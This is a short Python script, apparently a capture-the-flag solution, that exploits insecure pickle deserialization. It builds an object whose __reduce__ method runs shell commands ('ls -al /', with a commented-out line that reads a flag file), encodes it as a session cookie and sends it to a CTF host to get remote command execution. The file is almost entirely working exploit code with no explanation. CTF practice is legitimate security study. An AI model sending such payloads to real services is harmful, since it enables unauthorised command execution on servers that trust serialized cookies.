import os
import requests
import base64
import pickle
import subprocess

if __name__=="__main__":
    class Exploit(object):
        def __reduce__(self):
            #return (subprocess.check_output, (['cat','/flag_5fb2acebf1d0c558'],))
            return (subprocess.check_output, (['ls','-al','/'],))

    #s = pickle.loads(pickle.dumps({"name" : Exploit(), "age" : "13"}))
    user = base64.b64encode(pickle.dumps({"name" : Exploit(), "age" : "13"}))
    cookie = { "session" : user.decode("utf-8") }
    r = requests.get( url="http://h4ck3r.quest:8600/", cookies=cookie )
    string = r.content.split(b'\\n')
    [print(string[i]) for i in range(len(string))]
